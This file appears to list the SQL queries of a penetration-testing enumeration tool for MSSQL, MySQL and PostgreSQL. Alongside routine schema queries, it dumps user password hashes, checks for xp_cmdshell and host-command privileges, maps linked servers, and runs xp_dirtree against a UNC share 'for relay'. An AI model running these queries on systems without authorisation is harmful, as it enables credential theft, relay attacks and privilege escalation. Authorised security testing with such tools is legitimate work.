-- List of all queries used in sql_enum:

-- MSSQL
-- Get server version
SELECT @@VERSION;
-- Get username and password hashes for MSSQL users
SELECT name, password_hash FROM sys.sql_logins;
-- Get usernames and account status for MSSQL users
SELECT name, is_disabled FROM sys.server_principals;
-- Get list of databases on the server
SELECT name FROM sys.databases WHERE database_id > 4;
-- Get list of tables for a specific database
SELECT TABLE_NAME, TABLE_SCHEMA FROM {db}.INFORMATION_SCHEMA.TABLES;
-- Get list of columns per database
SELECT COLUMN_NAME, TABLE_SCHEMA, TABLE_NAME, TABLE_CATALOG FROM {db}.INFORMATION_SCHEMA.COLUMNS;
-- Determine if xp_cmdshell is enabled
SELECT name, value_in_use FROM sys.configurations WHERE name = \'xp_cmdshell\';
-- Determine is current user is sysadmin
SELECT IS_SRVROLEMEMBER(\'sysadmin\');
-- Check specific database privs
SELECT IS_ROLEMEMBER(\'db_owner\');
-- List all current database connections
EXEC sp_who2;
-- Find any linked MSSQL servers
SELECT name AS LinkedServerName, product AS Product, provider AS Provider, data_source AS RemoteAddress, is_remote_login_enabled AS RemoteLogin, modify_date FROM sys.servers WHERE is_linked = 1;
-- Print out sample of sysmail records
SELECT TOP 10 recipients, subject, body FROM msdb.dbo.sysmail_allitems;
-- Execute xp_dirtree for relay (the two dots are intentional)
EXEC master..xp_dirtree '\\path\share', 1, 1;
-- Get datatype for columns
SELECT DATA_TYPE FROM {database}.INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME = '{column}' AND TABLE_NAME = '{table}'

-- MySQL
-- Get server version
SELECT @@version;
-- Get user hashes for the database (version >= 8.0 or >= 5.7)
SELECT user AS name, authentication_string AS password_hash FROM mysql.user;
-- Get user hashes for the database (version < 5.7)
SELECT user AS name, password AS password_hash FROM mysql.user;
-- Get list of database users
SELECT CONCAT( user, "@", host) AS query, account_locked FROM mysql.user;
-- Get list of databases on the server
SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN (\'information_schema\', \'mysql\', \'performance_schema\', \'sys\');
-- Get list of tables for a specific database
SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema NOT IN (\'information_schema\', \'mysql\', \'performance_schema\', \'sys\');
-- Get list of columns for a specific database
SELECT COLUMN_NAME, TABLE_SCHEMA, TABLE_NAME, TABLE_CATALOG FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA NOT IN (\'information_schema\', \'mysql\', \'performance_schema\', \'sys\');
-- Determine if user has FILE permission
SELECT CONCAT(user, \"@\", host) as User, file_priv FROM mysql.user WHERE user = SUBSTRING_INDEX(CURRENT_USER(), \'@\', 1);
-- Check for env variables that control where file out's are written
SHOW VARIABLES LIKE 'secure_file_priv';
-- Check for system privileges
SELECT User, Host, Super_priv, File_priv, Grant_priv FROM mysql.user WHERE user = SUBSTRING_INDEX(CURRENT_USER(), \'@\', 1) AND (Super_priv = \'Y\' OR File_priv = \'Y\' OR Grant_priv = \'Y\');
-- Check for privs per db
SELECT 
    GRANTEE, 
    TABLE_SCHEMA, 
    PRIVILEGE_TYPE 
FROM information_schema.SCHEMA_PRIVILEGES 
WHERE GRANTEE = CONCAT('\\'', REPLACE(CURRENT_USER(), '@', '\\'@\\''), '\\'');
-- Check for database connections
SHOW FULL PROCESSLIST;
-- Check for linked MySQL servers
SELECT 
    table_schema AS local_db, 
    table_name AS local_table, 
    engine, 
    create_options AS connection_string
FROM information_schema.tables 
WHERE engine = 'FEDERATED';
-- Check datatype of specific column
SELECT DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{database}' AND COLUMN_NAME = '{column}' AND TABLE_NAME = '{table}';

-- PostgreSQL
-- Get server version
SELECT version();
-- Get user hashes
SELECT usename AS name, passwd AS password_hash FROM pg_shadow;
-- Get list of database users
SELECT rolname AS username, CASE WHEN rolvaliduntil < CURRENT_TIMESTAMP THEN \'EXPIRED\' WHEN rolcanlogin = \'f\' THEN \'DISABLED\' ELSE \'ACTIVE\' END AS status FROM pg_roles WHERE rolname NOT LIKE \'pg_%\';
-- Get list of databases on the server
SELECT datname FROM pg_database WHERE datistemplate = false;
-- Get list of tables for a specific database
SELECT table_name, table_schema FROM INFORMATION_SCHEMA.TABLES WHERE table_schema NOT IN (\'information_schema\', \'pg_catalog\');
-- Get list of columns for a specific database
SELECT COLUMN_NAME, TABLE_SCHEMA, TABLE_NAME, TABLE_CATALOG FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema NOT IN (\'information_schema\', \'pg_catalog\');
-- Check if user can execute host commands
SELECT ((SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER) OR pg_has_role(current_user, \'pg_execute_server_program\', \'member\')) AS has_rce_privs;
-- Check for system admin privs
SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;
-- Check for privileges per database
SELECT (r.rolname = current_user) as is_owner FROM pg_database d JOIN pg_roles r ON d.datdba = r.oid WHERE d.datname = current_database();
-- Check for database connections
SELECT pid, usename AS user, datname AS database, client_addr AS ip_address, backend_start AS login_time, state, query AS current_query FROM pg_stat_activity ORDER BY backend_start DESC;
-- Check for linked PostgreSQL servers
SELECT * FROM pg_foreign_server;
-- Check datatype of specific column
SELECT DATA_TYPE FROM {database}.INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME = '{column}' AND TABLE_NAME = '{table}'